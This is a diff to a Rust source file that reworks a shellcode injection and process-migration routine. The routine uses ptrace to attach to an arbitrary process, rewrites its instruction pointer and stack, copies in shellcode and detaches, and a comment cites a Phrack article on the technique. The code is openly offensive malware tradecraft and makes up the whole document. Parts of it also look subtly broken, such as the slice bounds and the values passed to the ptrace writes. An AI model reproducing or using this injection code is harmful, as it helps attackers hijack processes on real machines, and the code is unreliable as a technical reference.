@@ -1,7 +1,10 @@
 extern crate nix;
-use nix::sys::uio::{IoVec, process_vm_readv, process_vm_writev, RemoteIoVec};
+use nix::sys::ptrace::{attach, detach, getregs, setregs, write};
+use nix::sys::wait::waitpid;
 use nix::unistd::Pid;
 use std::process::{self, Command};
+use std::ffi::c_void;
+use std::cmp;
 
 pub fn inject_and_migrate(shellcode: &[u8]) {
     println!("Shellcode len: {}", shellcode.len());
@@ -18,37 +21,48 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
     pids.retain(|i| *i != 1);
     pids.retain(|i| *i != process::id() as i32);
     for pid in pids.iter() {
-        let pmap = Command::new("pmap")
-                    .arg(pid.to_string())
-                    .output()
-                    .unwrap();
-        let r_x_addresses: Vec<String> = String::from_utf8(pmap.stdout)
-                                                .unwrap()
-                                                .split('\n')
-                                                .filter(|s| s.contains("r-x"))
-                                                .map(|s| s.to_string())
-                                                .collect();
-        if r_x_addresses.is_empty() {
-            continue;
-        }
-        let addr = r_x_addresses[0]
-                        .split(' ')
-                        .collect::<Vec<&str>>()[0];
-        let addr = usize::from_str_radix(addr, 16).unwrap();
-        
-        let buff_len = 8;
-        let mut read_buff = vec![0u8, buff_len];
-        let local = &[IoVec::from_mut_slice(&mut read_buff)];
-        let remote = &[RemoteIoVec{base: addr as usize, len: buff_len as usize}];
-        let read_result = process_vm_readv(Pid::from_raw(*pid), local, remote);
-        if read_result.is_ok() {
+        let attach_result = attach(Pid::from_raw(*pid));
+        if attach_result.is_ok() {
             target_pid = *pid;
             break;
         }
     }
     if target_pid == 0 {
-        panic!("Could not find a process to whose memory can be manipulated");
+        panic!("Could not find a process whose memory can be manipulated");
     }
-    println!("{:?}", target_pid);
+    println!("Target PID: {:?}", target_pid);
+    let target_pid = Pid::from_raw(target_pid);
+    if let Err(error) = waitpid(target_pid, None) {
+        panic!("Could not wait for target process to change state: {}", error);
+    }
+    let mut registers = match getregs(target_pid) {
+        Err(error) => panic!("Could not get registers for target process: {}", error),
+        Ok(value) => value
+    };
+    println!("{:?}", registers);
+    registers.rsp -= 4;
+    println!("{:?}", registers);
+    //let blah = AddressType::new(registers.rsp);
+    if let Err(error) = unsafe { write(target_pid, registers.rsp as *mut c_void, registers.rip as *mut c_void) }{
+        panic!("Unable to write RIP to RSP in target process: {}", error);
+    }
+    let mut point = registers.rsp - 1024;
+    registers.rip = registers.rsp - 1022;
+    if let Err(error) = setregs(target_pid, registers) {
+        panic!("Unable to reset target process registers: {}", error);
+    }
+    let mut index = 0;
+    while index < shellcode.len() {
+        let slice = &shellcode[index..cmp::max(index, shellcode.len())];
+        if let Err(error) = unsafe { write(target_pid, point as *mut c_void, slice.as_ptr() as *mut c_void) }{
+            panic!("Unable to portion of shellcode at {} to target process: {}", index, error);
+        }
+        index += 4;
+        point += 4;
+    }
+
+    if let Err(error) = detach(target_pid, None) {
+        panic!("Unable to detach from target process: {}", error);
+    }
     // Try http://phrack.org/issues/59/12.html but with https://man7.org/linux/man-pages/man2/process_vm_readv.2.html
 }
